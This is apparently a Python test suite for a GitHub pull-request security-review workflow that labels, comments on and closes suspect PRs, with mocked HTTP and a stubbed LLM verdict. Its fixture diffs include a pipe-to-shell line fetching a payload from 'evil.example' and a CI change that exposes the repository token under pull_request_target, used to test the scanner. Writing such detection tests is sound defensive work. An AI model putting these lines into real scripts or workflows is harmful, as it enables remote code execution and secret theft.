"""Tests for the pr-security-review workflow.

GitHub API calls are mocked at the HTTP layer (nothing leaves the process) and
the LLM analysis activity is replaced by a stub with the same activity name.
"""

import asyncio
import uuid
from datetime import timedelta
from typing import Any

import httpx
from mistralai import workflows
from mistralai.workflows.testing import create_test_worker
from tests.support.http_clients import patch_http_send
from worker.workflows import pr_security_review as mod
from worker.workflows.pr_security_review import PRSecurityReview

EXECUTION_TIMEOUT = timedelta(seconds=20)
RESULT_TIMEOUT = 30

OWNER = "ligmaSec"
REPO = "victory-royale"

CLEAN_DIFF = """diff --git a/crates/victory-gpu/src/lib.rs b/crates/victory-gpu/src/lib.rs
index 1111111..2222222 100644
--- a/crates/victory-gpu/src/lib.rs
+++ b/crates/victory-gpu/src/lib.rs
@@ -1,3 +1,4 @@
+// harmless comment
 pub fn helper() {}
"""

MALICIOUS_DIFF = """diff --git a/scripts/setup.sh b/scripts/setup.sh
index 1111111..2222222 100644
--- a/scripts/setup.sh
+++ b/scripts/setup.sh
@@ -1,2 +1,3 @@
 #!/bin/sh
+curl https://evil.example/payload.sh | sh
 echo ok
"""

WORKFLOW_TAMPER_DIFF = """diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
index 1111111..2222222 100644
--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
@@ -1,3 +1,4 @@
-on: pull_request
+on: pull_request_target
+env:
+  TOKEN: ${{ secrets.GITHUB_TOKEN }}
"""


def make_pr(number: int, labels: list[str]) -> dict[str, Any]:
    return {
        "number": number,
        "title": f"PR {number}",
        "user": {"login": "contributor"},
        "labels": [{"name": name} for name in labels],
        "html_url": f"https://github.com/{OWNER}/{REPO}/pull/{number}",
    }


class GitHubMock:
    def __init__(self, prs: list[dict[str, Any]], diffs: dict[int, str]) -> None:
        self.prs = prs
        self.diffs = diffs
        self.requests: list[tuple[str, str, str]] = []
        self.comment_bodies: list[str] = []
        self.label_calls: list[tuple[int, list[str]]] = []
        self.closed: list[int] = []

    async def send(self, request: httpx.Request, **kwargs: Any) -> httpx.Response:
        method = request.method
        path = request.url.path
        body = request.content.decode() if request.content else ""
        self.requests.append((method, path, body))
        pulls = f"/repos/{OWNER}/{REPO}/pulls"
        if method == "GET" and path == pulls:
            return httpx.Response(200, json=self.prs, request=request)
        if method == "GET" and path.startswith(pulls + "/"):
            number = int(path.rsplit("/", 1)[1])
            if "vnd.github.v3.diff" in request.headers.get("accept", ""):
                return httpx.Response(
                    200, text=self.diffs.get(number, ""), request=request
                )
            pr = next(p for p in self.prs if p["number"] == number)
            return httpx.Response(
                200,
                json={
                    "number": number,
                    "title": pr["title"],
                    "body": "PR body text",
                    "user": pr["user"],
                    "html_url": pr["html_url"],
                    "created_at": "2026-11-25T00:00:00Z",
                    "base": {"ref": "main"},
                    "head": {"sha": "abc123"},
                },
                request=request,
            )
        if method == "GET" and path.endswith("/comments"):
            return httpx.Response(200, json=[], request=request)
        if method == "POST" and path.endswith("/labels") and "/issues/" not in path:
            return httpx.Response(201, json={"name": "ok"}, request=request)
        if method == "POST" and "/labels" in path:
            number = int(path.split("/issues/")[1].split("/")[0])
            import json

            self.label_calls.append((number, json.loads(body)["labels"]))
            return httpx.Response(200, json=[], request=request)
        if method == "POST" and path.endswith("/comments"):
            import json

            self.comment_bodies.append(json.loads(body)["body"])
            return httpx.Response(201, json={"id": 1}, request=request)
        if method == "PATCH" and path.startswith(pulls + "/"):
            number = int(path.rsplit("/", 1)[1])
            self.closed.append(number)
            return httpx.Response(200, json={"state": "closed"}, request=request)
        return httpx.Response(
            404, json={"message": f"unmocked {method} {path}"}, request=request
        )


def stub_analyze(verdict: dict[str, Any]) -> Any:
    @workflows.activity()
    async def analyze_pull_request(
        pr: dict[str, Any], diff: str, comments: list[dict[str, Any]], model: str
    ) -> dict[str, Any]:
        return verdict

    return analyze_pull_request


async def run_workflow(
    temporal_env: Any,
    monkeypatch: Any,
    gh: GitHubMock,
    verdict: dict[str, Any],
    input_overrides: dict[str, Any] | None = None,
) -> dict[str, Any]:
    monkeypatch.setenv("GITHUB_PR_BOT_TOKEN", "test-token")
    monkeypatch.setattr(mod, "analyze_pull_request", stub_analyze(verdict))
    patch_http_send(monkeypatch, gh.send)
    activities = [
        mod.list_open_pull_requests,
        mod.get_pull_request,
        mod.get_pull_request_diff,
        mod.list_issue_comments,
        mod.ensure_label,
        mod.add_labels,
        mod.post_issue_comment,
        mod.close_pull_request,
        mod.analyze_pull_request,
    ]
    async with create_test_worker(
        temporal_env, workflows=[PRSecurityReview], activities=activities
    ):
        handle = await temporal_env.client.start_workflow(
            "pr-security-review",
            {"owner": OWNER, "repo": REPO, **(input_overrides or {})},
            id=f"test-pr-review-{uuid.uuid4()}",
            task_queue="test-task-queue",
            execution_timeout=EXECUTION_TIMEOUT,
        )
        return await asyncio.wait_for(handle.result(), timeout=RESULT_TIMEOUT)


CLEAN_VERDICT = {
    "verdict": "clean",
    "confidence": 0.9,
    "summary": "Looks fine.",
    "evidence": [],
}
MALICIOUS_VERDICT = {
    "verdict": "malicious",
    "confidence": 0.95,
    "summary": "Pipes a remote script into sh.",
    "evidence": ["scripts/setup.sh:3"],
}


async def test_clean_pr_is_commented_labeled_and_left_open(
    temporal_env: Any, monkeypatch: Any
) -> None:
    gh = GitHubMock([make_pr(20, [])], {20: CLEAN_DIFF})
    result = await run_workflow(temporal_env, monkeypatch, gh, CLEAN_VERDICT)
    assert result["scanned"] == 1
    assert result["skipped_already_reviewed"] == []
    report = result["reports"][0]
    assert report["verdict"] == "clean"
    assert report["flags"] == []
    assert "comment" in report["actions"]
    assert gh.closed == []
    assert any((20, [mod.REVIEWED_LABEL]) in gh.label_calls for _ in [0])
    assert any(mod.REVIEWED_LABEL in labels for _, labels in gh.label_calls)
    assert len(gh.comment_bodies) == 1
    assert "clean" in gh.comment_bodies[0].lower()


async def test_high_confidence_malicious_pr_is_closed(
    temporal_env: Any, monkeypatch: Any
) -> None:
    gh = GitHubMock([make_pr(20, [])], {20: MALICIOUS_DIFF})
    result = await run_workflow(temporal_env, monkeypatch, gh, MALICIOUS_VERDICT)
    report = result["reports"][0]
    assert report["verdict"] == "malicious"
    assert "closed" in report["actions"]
    assert any("pipe-to-shell" in flag for flag in report["flags"])
    assert gh.closed == [20]
    assert any(mod.MALICIOUS_LABEL in labels for _, labels in gh.label_calls)
    assert any("malicious" in body.lower() for body in gh.comment_bodies)


async def test_dry_run_performs_no_writes(temporal_env: Any, monkeypatch: Any) -> None:
    gh = GitHubMock([make_pr(20, [])], {20: MALICIOUS_DIFF})
    result = await run_workflow(
        temporal_env, monkeypatch, gh, MALICIOUS_VERDICT, {"dry_run": True}
    )
    report = result["reports"][0]
    assert result["dry_run"] is True
    assert "dry-run: no writes" in report["actions"]
    assert "dry-run: would close" in report["actions"]
    writes = [r for r in gh.requests if r[0] in ("POST", "PATCH")]
    assert writes == []
    assert gh.closed == []


async def test_already_reviewed_pr_is_skipped(
    temporal_env: Any, monkeypatch: Any
) -> None:
    gh = GitHubMock([make_pr(21, [mod.REVIEWED_LABEL])], {})
    result = await run_workflow(temporal_env, monkeypatch, gh, CLEAN_VERDICT)
    assert result["skipped_already_reviewed"] == [21]
    assert result["reports"] == []
    assert gh.requests == [("GET", f"/repos/{OWNER}/{REPO}/pulls", "")]


def test_static_scan_flags() -> None:
    pipe_flags = mod.static_scan(MALICIOUS_DIFF)
    assert any(
        f["rule"] == "pipe-to-shell" and f["severity"] == "high" for f in pipe_flags
    )
    wf_flags = mod.static_scan(WORKFLOW_TAMPER_DIFF)
    assert any(
        f["rule"] == "ci-workflow-secrets" and f["severity"] == "high" for f in wf_flags
    )
    assert mod.static_scan(CLEAN_DIFF) == []


def test_decide() -> None:
    assert mod.decide({"verdict": "malicious", "confidence": 0.9}, []) == (
        "malicious",
        True,
    )
    assert mod.decide({"verdict": "malicious", "confidence": 0.5}, []) == (
        "suspicious",
        False,
    )
    assert mod.decide({"verdict": "suspicious", "confidence": 0.6}, []) == (
        "suspicious",
        False,
    )
    assert mod.decide({"verdict": "clean", "confidence": 0.9}, []) == ("clean", False)
    flags = [{"rule": "pipe-to-shell", "severity": "high", "file": "x.sh"}]
    assert mod.decide({"verdict": "clean", "confidence": 0.99}, flags) == (
        "malicious",
        True,
    )
